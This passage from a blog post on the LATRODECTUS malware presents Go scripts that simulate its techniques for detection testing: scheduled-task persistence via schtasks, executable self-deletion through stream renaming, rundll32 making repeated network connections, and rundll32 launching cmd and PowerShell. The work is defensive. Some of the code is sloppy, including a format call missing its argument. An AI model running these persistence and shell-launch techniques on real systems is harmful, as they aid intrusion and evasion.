</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;successfully executed untrusted command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execution from commonly abused path
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	abusedPathCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_abused_path /tr calc.exe /sc daily /f&#34;</span>)
</span></span><span style="display:flex;"><span>	abusedPathCmdOut, abusedPathErr <span style="color:#ff79c6">:=</span> abusedPathCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> abusedPathErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute abused path command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(abusedPathCmdOut))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;successfully executed abused path command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execution from mounted device
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mountedDeviceCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_mounted_device /tr calc.exe /sc daily /f&#34;</span>)
</span></span><span style="display:flex;"><span>	mountedDeviceCmdOut, mountedDeviceErr <span style="color:#ff79c6">:=</span> mountedDeviceCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> mountedDeviceErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute mounted device command: %s&#34;</span>))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully executed mounted device command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully executed all commands&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Clean up any created files or artifacts
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_untrusted /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_abused_path /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_mounted_device /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects persistence methods like task creation that isn&rsquo;t linked to a typical system management process</p>
<h3 id="potential-self-deletion-of-a-running-executable">potential self deletion of a running executable</h3>
<p>the malware can delete its own executable after execution, to evade post-infection forensic analysis.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate execution of a file followed by the rename of its primary file stream
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	executablePath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe&#34;</span>
</span></span><span style="display:flex;"><span>	renamedPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe:delete&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, executablePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// run executable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;start %s&#34;</span>, executablePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rename primary file stream
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Rename-Item -Path %s -NewName %s&#34;</span>, executablePath, renamedPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// check rename action
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">if</span> _, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Stat</span>(renamedPath); os.<span style="color:#50fa7b">IsNotExist</span>(err) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] renamed file does not exist&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove the created files
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe:delete&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects attempts to remove running executables from the disk.</p>
<h3 id="long-termhigh-count-of-network-connections-by-rundll32">long-term/high-count of network connections by <code>rundll32</code></h3>
<p><code>LATRODECTUS</code> uses <code>rundll32.exe</code> to create a high number of network connections [C2 comms or data exfiltration].</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED: Access Denied
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe creating a PE file in the InetCache folder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	rundll32Path <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\rundll32.exe&#34;</span>
</span></span><span style="display:flex;"><span>	peFilePath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\malicious.exe&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c echo 4D5A &gt; %s&#34;</span>, rundll32Path, peFilePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe making network connections to public IP addresses
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	publicIPs <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;8.8.8.8&#34;</span>, <span style="color:#f1fa8c">&#34;8.8.4.4&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, ip <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> publicIPs {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c ping %s&#34;</span>, rundll32Path, ip))
</span></span><span style="display:flex;"><span>		time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">100</span> <span style="color:#ff79c6">*</span> time.Millisecond)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// long-term and high count of network connections
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	startTime <span style="color:#ff79c6">:=</span> time.<span style="color:#50fa7b">Now</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#bd93f9">0</span>; i &lt; <span style="color:#bd93f9">100</span>; i<span style="color:#ff79c6">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, ip <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> publicIPs {
</span></span><span style="display:flex;"><span>			<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c ping %s&#34;</span>, rundll32Path, ip))
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">10</span> <span style="color:#ff79c6">*</span> time.Millisecond)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	duration <span style="color:#ff79c6">:=</span> time.<span style="color:#50fa7b">Since</span>(startTime)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> duration.<span style="color:#50fa7b">Seconds</span>() &lt; <span style="color:#bd93f9">1</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Long-term and high count network connection simulation successful&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	} <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] Simulation took too long&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the script detects abnormal network activity associated with <code>rundll32.exe</code>, especially when the activity involves multiple connections to public IP addresses.</p>
<h3 id="command-shell-activity-started-via-rundll32">command shell activity started via <code>rundll32</code></h3>
<p><code>rundll32.exe</code> can be used to launch a command shell, that&rsquo;s then used to execute malicious commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe launching a command shell (cmd.exe) with a malicious command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	rundll32Path <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\rundll32.exe&#34;</span>
</span></span><span style="display:flex;"><span>	cmdPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>
</span></span><span style="display:flex;"><span>	rundll32Cmd <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s %s&#34;</span>, rundll32Path, cmdPath)
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(rundll32Cmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe launching PowerShell with a malicious command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	powershellPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</span>
</span></span><span style="display:flex;"><span>	rundll32PowershellCmd <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s %s&#34;</span>, rundll32Path, powershellPath)
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(rundll32PowershellCmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects suspicious usage of <code>rundll32.exe</code> to initiate command shells, which is uncommon but a potent method of executing further commands.</p>
<h2 id="conclusion">conclusion</h2>
<p>after deep-diving into the code and reverse engineering the malware, i developed a series of Go scripts to detect the key behaviors <code>LATRODECTUS</code> exhibits. the process involved decrypting strings, analyzing how the malware resolves native APIs dynamically, and understanding its payload delivery mechanisms. with these insights, i was able to create detection methods that directly address the tactics used by this malware. the goal wasnât just to stop it in its tracks but to make sure weâre catching every subtle move it makes. each script is a result of careful analysis, aimed at covering all the gaps this malware might exploit.</p>
</main>



<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/cosmos-1/" style="float: right"
      >next: cosmos, part 1: red-teaming corporate active directory forests</a
    >
     
    <a class="previous" href="/posts/go-pro/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>